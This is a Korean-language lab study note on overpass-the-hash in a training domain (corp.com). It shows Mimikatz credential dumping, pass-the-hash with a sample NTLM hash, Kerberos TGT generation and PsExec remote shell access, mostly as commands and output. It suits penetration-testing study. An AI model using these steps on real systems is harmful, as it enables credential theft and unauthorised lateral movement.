NTLM 해시를 “과도하게(over)” 남용하면, Kerberos의 full Ticket Granting Ticket (TGT) 를 획득할 수 있다.

> 이 경우에는 새로 만든 powershell 세션에서 **whoami** 명령을 치면 **jen 대신 jeff의 ID가 표시**된다. 이는 현재 프로세스의 토큰만 확인하고 가져온 **Kerberos 티켓은 검사하지 않는 whoami 유틸리티의 의도된 동작**임.

**mimikatz** (win, debug 권한 필요)
```powershell
privilege::debug
sekurlsa::logonpasswords
# 해시 탈취 후
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

```powershell
# powershell로 돌아와서
# Kerberos 티켓 나열
klist
# 아직 안뜸: 대화형 로그인을 아직 수행하지 않았기 때문

# 네트워크 공유에 인증하여 TGT 생성
net use \\\\files04
#The command completed successfully.
klist
#Cached Tickets: (2)

##0>     Client: jen @ CORP.COM
#        **Server: krbtgt/CORP.COM @ CORP.COM**
# ...
#1>     Client: jen @ CORP.COM
#        **Server: cifs/files04 @ CORP.COM**
# ...
```

TGT 로 변환했으니, Kerberos 인증에 의존하는 모든 도구를 사용할 수 있다. PsExec을 사용하여 file04 쉘에 접근하는 예시:

**PsExec (win)**
```powershell
.\\PsExec.exe \\\\files04 cmd

#...
C:\\Windows\\system32>whoami
#corp\\jen

C:\\Windows\\system32>hostname
#FILES04
```